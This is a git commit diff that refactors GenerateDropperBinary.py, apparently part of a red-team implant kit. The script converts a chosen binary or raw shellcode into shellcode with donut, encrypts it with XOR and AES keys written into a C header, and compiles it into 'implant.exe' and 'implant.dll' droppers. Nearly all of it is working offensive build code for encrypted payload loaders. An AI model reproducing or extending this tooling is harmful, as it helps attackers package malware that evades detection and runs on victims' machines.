d260c2a877f8bdc8cab12d3a7344cf0e76fa9c24
kali <kali@kali.com>
2024-09-03 09:13:07 +0200

    Minor

--- GenerateDropperBinary.py
+++ GenerateDropperBinary.py
@@ -6,9 +6,12 @@ import hashlib
 import random
 import string
 import subprocess
+from pathlib import Path
+
 
 characters = string.ascii_letters + string.digits
 password = ''.join(random.choice(characters) for i in range(16))
+
 
 KEY_XOR = password.replace('"','-').replace('\'','-')
 KEY_AES = urandom(16)
@@ -17,6 +20,7 @@ KEY_AES = urandom(16)
 def pad(s):
 	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode('ISO-8859-1')
 
+
 def aesenc(plaintext, key):
 	k = hashlib.sha256(key).digest()
 	iv = 16 * b'\x00'
@@ -24,6 +28,7 @@ def aesenc(plaintext, key):
 	cipher = AES.new(k , AES.MODE_CBC, iv)
 	output = cipher.encrypt(plaintext)
 	return output
+
 
 def xor(data, key):
 	
@@ -38,54 +43,24 @@ def xor(data, key):
 	
 	return output_str
 
+
 def printCiphertext(ciphertext):
 	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'
 
 
-def main(argv):
-        if os.name == 'nt':
-                fileEncrypt = open('.\\bin\\cryptDef.h', 'w')
-        else:
-                fileEncrypt = open('./bin/cryptDef.h', 'w')
-        fileClear = open('clearDef.h', 'r')
-
-        if(len(argv)<2):
-                print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
-                print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
-                exit()
-
-        binary=""
-        binaryArgs=""
-        rawShellCode=""
-
-        opts, args = getopt.getopt(argv,"hb:a:r:",["binary=","args="])
-        for opt, arg in opts:
-                if opt == '-h':
-                        print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
-                        print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
-                        sys.exit()
-                elif opt in ("-b", "--binary"):
-                        binary = arg
-                elif opt in ("-a", "--args"):
-                        binaryArgs = arg
-                elif opt == '-r':
-                        rawShellCode = arg
-        
-        print('[+] Generate dropper for params:')
-        print('binary ', binary)
-        print('binaryArgs ', binaryArgs)
-        print('')
-
-        #dllArgs = '{} {} {}'.format(ip, port, listenerType)
-
+def generatePayloads(binary, binaryArgs, rawShellCode):
         if binary:
                 print('binary ', binary)
                 print('binaryArgs ', binaryArgs)
                 print('')
                 if os.name == 'nt':
-                        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\bin\\dropper.bin', binary)
+                        donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
+                        shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\dropper.bin')
+                        args = (donutBinary, '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
                 else:   
-                        args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './bin/dropper.bin', '-i' , binary)
+                        donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
+                        shellcodePath = os.path.join(Path(__file__).parent, './bin/dropper.bin')
+                        args = (donutBinary, '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i' , binary)
                 popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                 popen.wait()
                 output = popen.stdout.read()
@@ -93,16 +68,23 @@ def main(argv):
                 print("[+] Generate shellcode of payload with donut")
                 print(output.decode("utf-8") )
 
-                if os.name == 'nt':
-                        shellcode = open(".\\bin\\dropper.bin", "rb").read()
-                else:
-                        shellcode = open("./bin/dropper.bin", "rb").read() 
+                shellcode = open(shellcodePath, "rb").read()
 
         elif rawShellCode:
                 print('rawShellCode ', rawShellCode)
                 print('')
 
                 shellcode = open(rawShellCode, "rb").read()
+
+        if os.name == 'nt':
+                fileEncryptPath = os.path.join(Path(__file__).parent, '.\\bin\\cryptDef.h')
+                fileEncrypt = open(fileEncryptPath, 'w')
+        else:
+                fileEncryptPath = os.path.join(Path(__file__).parent, './bin/cryptDef.h')
+                fileEncrypt = open(fileEncryptPath, 'w')
+
+        fileClearPath = os.path.join(Path(__file__).parent, 'clearDef.h')
+        fileClear = open(fileClearPath, 'r')
 
         Lines = fileClear.readlines()
 
@@ -153,14 +135,61 @@ def main(argv):
 
         print("[+] Compile dropper with shellcode")
         if os.name == 'nt':
-                args = ".\\compile.bat".split()
+                compileScript = os.path.join(Path(__file__).parent, '.\\compile.bat')
+                args = compileScript.split()
         else:   
-                args = "./compile.sh".split()
-        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+                compileScript = os.path.join(Path(__file__).parent, './compile.sh')
+                args = compileScript.split()
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=Path(__file__).parent)
         popen.wait()
         output = popen.stdout.read()
         print(output.decode("utf-8") )
-                
+
+        "./bin/implant.exe"
+        if os.name == 'nt':
+                dropperExePath = os.path.join(Path(__file__).parent, 'bin\\implant.exe')
+                dropperDllPath = os.path.join(Path(__file__).parent, 'bin\\implant.dll')
+        else:
+                dropperExePath = os.path.join(Path(__file__).parent, 'bin/implant.exe')
+                dropperDllPath = os.path.join(Path(__file__).parent, 'bin/implant.dll')
+
+        return dropperExePath, dropperDllPath
+
+
+def main(argv):
+
+        if(len(argv)<2):
+                print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
+                exit()
+
+        binary=""
+        binaryArgs=""
+        rawShellCode=""
+
+        opts, args = getopt.getopt(argv,"hb:a:r:",["binary=","args="])
+        for opt, arg in opts:
+                if opt == '-h':
+                        print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                        print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
+                        sys.exit()
+                elif opt in ("-b", "--binary"):
+                        binary = arg
+                elif opt in ("-a", "--args"):
+                        binaryArgs = arg
+                elif opt == '-r':
+                        rawShellCode = arg
+        
+        print('[+] Generate dropper for params:')
+        print('binary ', binary)
+        print('binaryArgs ', binaryArgs)
+        print('')
+
+        dropperExePath, dropperDllPath = generatePayloads(binary, binaryArgs, rawShellCode)
+
+        print(dropperExePath)
+        print(dropperDllPath)
+
 
 if __name__ == "__main__":
     main(sys.argv[1:])
